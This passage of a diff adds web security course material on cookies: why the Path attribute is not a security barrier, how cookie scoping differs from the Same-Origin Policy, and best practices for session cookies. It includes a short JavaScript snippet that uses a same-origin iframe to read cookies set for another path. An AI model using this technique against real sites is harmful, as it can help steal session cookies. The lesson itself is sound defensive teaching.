+inconsistencies with modern web security models. The lack of a proper
+specification for 17 years led to inconsistent implementations across
+browsers and security models that don’t align with newer web platform
+features.</p>
+<h2 id="cookie-security-properties">Cookie Security Properties</h2>
+<h3 id="the-path-attribute-is-not-security">The Path Attribute is Not
+Security</h3>
+<p>When creating cookies, you can set an optional <code>Path</code>
+attribute. That cookie will only be loaded/sent on URLs descending from
+that path. For example, if this cookie is set:</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>res<span class="op">.</span><span class="fu">cookie</span>(<span class="st">&#39;sessionId&#39;</span><span class="op">,</span> id<span class="op">,</span> { <span class="dt">path</span><span class="op">:</span> <span class="st">&#39;/admin&#39;</span> })<span class="op">;</span></span></code></pre></div>
+<p>Then it will only be sent on <code>/admin</code> and
+<code>/admin/*</code> pages, and not <code>/</code>,
+<code>/public</code>, etc.</p>
+<p>This might seem like a useful security tool. However, this is not a
+real security barrier; same-origin JavaScript can still read cookies
+from any path using an iframe:</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co">// On /app</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> iframe <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">createElement</span>(<span class="st">&#39;iframe&#39;</span>)<span class="op">;</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>iframe<span class="op">.</span><span class="at">src</span> <span class="op">=</span> <span class="st">&#39;/admin&#39;</span><span class="op">;</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="fu">appendChild</span>(iframe)<span class="op">;</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> adminCookies <span class="op">=</span> iframe<span class="op">.</span><span class="at">contentDocument</span><span class="op">.</span><span class="at">cookie</span><span class="op">;</span></span></code></pre></div>
+<p>The Same-Origin Policy allows this because both pages are on the same
+origin. <code>Path</code> should only be used as a namespacing
+convention and performance tool, never for security.</p>
+<h3 id="cookie-origin-model-vs-same-origin-policy">Cookie Origin Model
+vs Same-Origin Policy</h3>
+<p>Cookies use a different security model than the rest of the web
+platform. The Same-Origin Policy (covered in Lesson 4) considers two
+URLs to be same-origin if they share the same protocol, hostname, and
+port. However, cookies behave differently:</p>
+<ul>
+<li><strong>Protocol</strong>: Cookies ignore protocol unless the
+<code>Secure</code> flag is set</li>
+<li><strong>Hostname</strong>:
+<ul>
+<li>Cookies are set with a <code>Domain</code> attribute. Cookies set
+with <code>Domain=example.com</code> will be sent for
+<code>example.com</code> <em>and all subdomains</em>, such as
+<code>foo.example.com</code>. This differs from the Same-Origin Policy,
+where any difference in domains is considered a separate origin.</li>
+<li>A subdomain <code>foo.example.com</code> can elect to set
+<code>Domain</code> to a parent domain, such as
+<code>example.com</code>, so that the cookie will be shared with the
+parent and other subdomains.</li>
+<li>However, <code>example.com</code> cannot set cookies with restricted
+scope for a subdomain such as <code>foo.example.com</code>.</li>
+</ul></li>
+<li><strong>Port</strong>: Cookies completely ignore ports. Any cookies
+from <code>example.com:1234</code> will also be sent to
+<code>example.com:2345</code>.</li>
+<li><strong>Path</strong>: The <code>Path</code> attribute affects which
+cookies are sent in HTTP headers, but it does not affect which cookies
+can be loaded via JavaScript, so it is not a reliable security
+tool.</li>
+</ul>
+<h2 id="best-practices-summary">Best Practices Summary</h2>
+<ol type="1">
+<li><strong>Store session data server-side</strong>. Ensure sessions are
+robust against an attacker forging false values. Maintain a session
+store that can be invalidated by the server if needed.</li>
+<li><strong>Generate secure session IDs</strong>. Use cryptographically
+secure random values, and make them long enough (at least 128
+bits).</li>
+<li><strong>Set proper cookie flags</strong>. Use <code>httpOnly</code>
+to prevent JavaScript access, <code>secure</code> to ensure that cookies
+are not sent over HTTP connections, and <code>sameSite: lax</code> to
+protect against CSRF (Lesson 6).</li>
+<li><strong>Implement proper session lifecycle</strong>. Set reasonable
+cookie expiration times and implement session expiration on the
+server.</li>
+<li><strong>Use HTTPS everywhere</strong>. This prevents session cookie
+theft (and much more).</li>
+</ol>
+<p>In the next lesson, we’ll explore Cross-Site Request Forgery (CSRF)
+attacks, which exploit how cookies are automatically included with
+requests.</p>
